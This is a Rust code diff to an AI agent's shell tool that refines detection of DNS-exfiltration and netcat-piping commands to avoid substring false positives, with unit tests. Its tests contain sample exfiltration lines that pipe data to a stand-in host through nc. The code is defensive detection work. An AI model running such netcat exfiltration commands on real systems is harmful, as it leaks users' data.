@@ -178,6 +178,17 @@ const SAFE_ENV_VARS: &[&str] = &[
     // Editor (for git commit, etc.)
     "EDITOR",
     "VISUAL",
+    // Windows (no-ops on Unix, but needed if we ever run on Windows)
+    "SystemRoot",
+    "SYSTEMROOT",
+    "ComSpec",
+    "PATHEXT",
+    "APPDATA",
+    "LOCALAPPDATA",
+    "USERPROFILE",
+    "ProgramFiles",
+    "ProgramFiles(x86)",
+    "WINDIR",
 ];
 
 /// Check whether a shell command contains patterns that must never be auto-approved.
@@ -227,15 +238,23 @@ pub fn detect_command_injection(cmd: &str) -> Option<&'static str> {
         return Some("binary decode piped to shell");
     }
 
-    // DNS exfiltration: dig/nslookup/host with command substitution
-    if (lower.contains("dig ") || lower.contains("nslookup ") || lower.contains("host "))
+    // DNS exfiltration: dig/nslookup/host with command substitution.
+    // Use has_command_token to avoid false positives on words containing
+    // "host" (e.g., "ghost", "--host") or "dig" as substrings.
+    if (has_command_token(&lower, "dig ")
+        || has_command_token(&lower, "nslookup ")
+        || has_command_token(&lower, "host "))
         && has_command_substitution(&lower)
     {
         return Some("potential DNS exfiltration via command substitution");
     }
 
-    // Netcat with data piping (exfiltration channel)
-    if (lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat "))
+    // Netcat with data piping (exfiltration channel).
+    // Use has_command_token to avoid false positives on words containing
+    // "nc" as a substring (e.g., "sync", "once", "fence").
+    if (has_command_token(&lower, "nc ")
+        || has_command_token(&lower, "ncat ")
+        || has_command_token(&lower, "netcat "))
         && (lower.contains('|') || lower.contains('<'))
     {
         return Some("netcat with data piping");
@@ -278,6 +297,27 @@ fn contains_shell_pipe(lower: &str) -> bool {
 /// Check if a command string contains shell command substitution (`$(...)` or backticks).
 fn has_command_substitution(s: &str) -> bool {
     s.contains("$(") || s.contains('`')
+}
+
+/// Check if `token` appears as a standalone command in `lower` (not as a substring
+/// of another word).
+///
+/// A token is "standalone" if it appears at the start of the string or is preceded
+/// by whitespace or a shell separator (`|`, `;`, `&`, `(`).
+///
+/// This prevents false positives like "sync " matching "nc " or "ghost " matching
+/// "host ".
+fn has_command_token(lower: &str, token: &str) -> bool {
+    for (i, _) in lower.match_indices(token) {
+        if i == 0 {
+            return true;
+        }
+        let before = lower.as_bytes()[i - 1];
+        if matches!(before, b' ' | b'\t' | b'|' | b';' | b'&' | b'\n' | b'(') {
+            return true;
+        }
+    }
+    false
 }
 
 /// Shell command execution tool.
@@ -797,6 +837,32 @@ mod tests {
         assert_eq!(tool.timeout, Duration::from_secs(60));
     }
 
+    // ── Command token matching ─────────────────────────────────────────
+
+    #[test]
+    fn test_has_command_token() {
+        // At start of string
+        assert!(has_command_token("nc evil.com 4444", "nc "));
+        assert!(has_command_token("dig example.com", "dig "));
+
+        // After pipe
+        assert!(has_command_token("cat file | nc evil.com", "nc "));
+        assert!(has_command_token("cat file |nc evil.com", "nc "));
+
+        // After semicolon
+        assert!(has_command_token("echo hi; nc evil.com 4444", "nc "));
+
+        // After &&
+        assert!(has_command_token("true && nc evil.com 4444", "nc "));
+
+        // Substrings must NOT match
+        assert!(!has_command_token("sync --filesystem", "nc "));
+        assert!(!has_command_token("ghost story", "host "));
+        assert!(!has_command_token("digital ocean", "dig "));
+        assert!(!has_command_token("docker --host foo", "host "));
+        assert!(!has_command_token("once upon", "nc "));
+    }
+
     // ── Injection detection tests ──────────────────────────────────────
 
     #[test]
@@ -848,6 +914,11 @@ mod tests {
         assert!(detect_command_injection("dig example.com").is_none());
         assert!(detect_command_injection("nslookup google.com").is_none());
         assert!(detect_command_injection("host localhost").is_none());
+
+        // Words containing "host"/"dig" as substrings must NOT false-positive
+        assert!(detect_command_injection("ghost $(date)").is_none());
+        assert!(detect_command_injection("docker --host myhost $(echo foo)").is_none());
+        assert!(detect_command_injection("digital $(uname)").is_none());
     }
 
     #[test]
@@ -859,6 +930,11 @@ mod tests {
 
         // Netcat without piping is fine (e.g., port scanning)
         assert!(detect_command_injection("nc -z localhost 8080").is_none());
+
+        // Words containing "nc" as a substring must NOT false-positive
+        assert!(detect_command_injection("sync --filesystem | cat").is_none());
+        assert!(detect_command_injection("once upon | grep time").is_none());
+        assert!(detect_command_injection("fence post < input.txt").is_none());
     }
 
     #[test]
